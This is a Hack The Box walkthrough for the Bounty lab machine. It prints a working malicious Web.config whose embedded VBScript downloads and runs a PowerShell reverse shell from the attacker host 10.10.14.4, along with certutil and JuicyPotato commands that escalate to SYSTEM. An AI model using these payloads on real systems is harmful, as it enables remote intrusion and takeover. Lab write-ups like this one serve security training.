# Bounty Overview

## Machine Details

|IP|Hostname|Operating System|
|---|---|---|
|10.10.10.93|Bounty|Windows|

## Path to Exploitation

Compromising Bounty requires exploit a web-server that allows us to upload various file types. One of these files includes the .config extension, we can leverage this to upload a malicious Web.config file that contains a reverse shell command. After getting on the machine, we run some basic user and system enumeration commands and see that our user has the seImpersonatePrivilege enabled. We then use the Juicy Potato exploit elevate our privileges to SYSTEM.

# Bounty Enumeration

## Full Port Scan

```bash
nmap 10.10.10.93 -p- -oA Bounty/nmap/full-port --open -Pn -vv
```

Which Resulted In:

|PORT|SERVICE|
|----|-------|
|80|http|

## Service Scan

```bash
nmap 10.10.10.93 -p 80 -sC -sV -oA Bounty/nmap/service-scan -Pn
```

Which Resulting In:

|PORT|SERVICE|VERSION|
|----|-------|-------|
|80|http|IIS httpd 7.5|

# Website

## Manually Inspecting the site

Landing page of the site:

![Site Page](/assets/HackTheBox/Bounty/site.png "Site Landing Page")

We can see the server is running IIS by inspecting the source of the page

![IIS 7](/assets/HackTheBox/Bounty/iis7.png "ISS 7")

We see in Burp the full version is 7.5

![IIS 7.5](/assets/HackTheBox/Bounty/iis7-5.png "ISS 7.5")

We see a potential vulnerability for this version of IIS [here](https://www.exploit-db.com/exploits/19033). 

## Directory Bruteforce

```shell
gobuster dir -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.10.93/ -o gobuster.out -x php,txt,aspx,asp,html
```

```shell
$ dirb http://10.10.10.93/
```

```shell
$ dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dirsearch.out -u http://10.10.10.93/
```

**Key Findings:**

```
/aspnet_client
/aspnet_client/system_web/
/transfer.aspx
/Trace.axd
/UploadedFiles
/WebResource.axd?d=LER8t9aS
```

We get a access denied when trying to browse to the /uploadedfiles/ endpoint

But find a file upload at /transfer.aspx

![File Upload](/assets/HackTheBox/Bounty/file-upload.png "File Upload")

## Shell on Host

### Targeting the File Upload 

We can identify which file types are allowed by using Burp Intruder. Attempt to upload a text file and send the request to Intruder.

Set the variable to the file extension

![Intruder Setup](/assets/HackTheBox/Bounty/intruder-setup.png "Setting up Intruder")

We will use a list of common file extensions as our target list. We first need to remove the dot to prevent any issues with Burp processing them

![Target List](/assets/HackTheBox/Bounty/target-list.png "Target List")

Load the file into Burp, and start the attack

![Intruder Attack](/assets/HackTheBox/Bounty/intruder-attack.png "Intruder Attack")

We soon see that the response length of 1350 indicates a successful upload

![Valid Response](/assets/HackTheBox/Bounty/valid-1350.png "Valid Response")

We can filter by this value to see all the acceptable file extensions.

![Valid File Types](/assets/HackTheBox/Bounty/valid-file-types.png "Valid File Types")

We see we are able to upload .config files, following [this](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/) article we see that we can exploit this to get command execution.

We can use a similar Web.config file to launch our reverse shell. We'll first want to transfer the Invoke-PowerShellTcp.ps1 script to our working directory and add the following line to the bottom of the file:
```shell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 443
```

We then create the following Web.config file:
```shell
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.4/Invoke-PowerShellTcp.ps1')")
%>
```

We add our command to the file to call back to our host, download, and execute the reverse shell payload.

Upload the file to the host, setup an HTTP server and a nc listener. Then navigate to /uploadedfiles/Web.config

We see that we have a shell on the box running as the merlin user

![Foothold](/assets/HackTheBox/Bounty/foothold.png "Foothold")

# Local Enumeration

## System Information

![System Information](/assets/HackTheBox/Bounty/system-info.png "System Information")

## User Enumeration

```shell
C:\> whoami /groups
```

![User Groups](/assets/HackTheBox/Bounty/user-groups.png "User Groups")

```shell
C:\> whoami /priv
```

![User Privileges](/assets/HackTheBox/Bounty/user-privs.png "User Privileges")

Based on these privileges it appears that this host may be vulnerable to the Juicy Potato exploit

# Privilege Escalation

Upload the Juicy Potato exploit

```shell
PS:\> certutil -urlcache -f http://10.10.14.4/JuicyPotato.exe C:\tmp\juicy.exe
```

We'll re-use our powershell script and run the same command we used in the Web.config file

Setup a nc listener and execute the command

```shell
PS:\> .\juicy.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.4/Invoke-PowerShellTcp.ps1')" -t *
```

Checking back on our listener we see have a shell running as SYSTEM
